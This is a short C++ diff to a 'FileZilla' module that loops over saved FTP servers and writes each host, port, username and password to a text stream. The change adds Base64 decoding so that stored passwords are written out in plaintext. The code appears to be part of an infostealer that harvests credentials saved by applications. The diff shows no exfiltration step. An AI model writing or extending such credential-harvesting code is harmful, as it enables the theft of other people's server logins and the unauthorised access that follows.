@@ -18,9 +18,11 @@ void FileZilla::execute(fs::path &root) {
     std::stringstream ss;
     for(const Server& server : servers)
     {
+        std::vector<BYTE> decodedPass = Base64Util::b64decode(server.pass);
+
         ss << "Url: " << "ftp://" << server.host << ":" << std::to_string(server.port) << "/" << "\n";
         ss << "Username: " << server.user << "\n";
-        ss << "Password: " << server.pass << "\n";
+        ss << "Password: " << std::string(decodedPass.begin(), decodedPass.end()) << "\n";
         ss << "\n";
     }
 
